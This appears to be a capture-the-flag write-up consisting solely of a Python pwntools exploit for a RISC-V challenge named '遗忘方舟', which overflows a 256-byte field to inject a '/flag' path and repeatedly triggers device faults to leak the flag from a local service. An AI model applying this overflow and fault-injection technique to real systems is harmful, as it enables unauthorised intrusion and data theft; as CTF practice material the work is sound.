---
data: 2024-11-25 22:07
challenge: 遗忘方舟
tags:
  - riscv
---

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian

from lianpwn import *
import binascii
import time

context.log_level = "info"

io = remote("127.0.0.1", 9977)


def ru(a, drop=False):
    return io.recvuntil(a, drop)


rl = lambda a=False: io.recvline(a)
rn = lambda x: io.recvn(x)
s = lambda x: io.send(x)
sl = lambda x: io.sendline(x)
sa = lambda a, b: io.sendafter(a, b)
sla = lambda a, b: io.sendlineafter(a, b)
ia = lambda: io.interactive()
dbg = lambda text=None: gdb.attach(io, text)
i2b = lambda c: str(c).encode()
u32_ex = lambda data: u32(data.ljust(4, b"\x00"))
u64_ex = lambda data: u64(data.ljust(8, b"\x00"))


def cmd(data, truncate_at_null=False):
    if truncate_at_null and b"\x00" in data:
        data_for_crc = data[: data.index(b"\x00")]
    else:
        data_for_crc = data

    crc32_checksum = binascii.crc32(data_for_crc) & 0xFFFFFFFF
    payload = data + b"|" + hex(crc32_checksum)[2:].encode()
    s(payload)


def get_flag():
    while True:
        data = io.recv()
        lg_inf(data)
        if b"flag{" in data:
            lg_suc(data[data.index(b"flag{") : data.index(b"}") + 1])
            exit(0)
        if b"Fault detected in device" in data:
            for _ in range(4):
                s(b"\x0b" * 3)
                time.sleep(0.01)


def trigger_error():
    command_sequences = [b"\x02\x32\x01", b"\x01\x02\x01"]
    for cmd_data in command_sequences:
        while True:
            cmd(cmd_data)
            data = io.recv()
            print(data)
            if b"Error" in data:
                break
            if b"Fault detected" in data:
                get_flag()


ru(b"====================\n\n")
payload = b"ARK000153\x00"
payload = payload.ljust(256, b"a")
payload += b"/flag\x00"
cmd(payload, True)


while True:
    trigger_error()
```
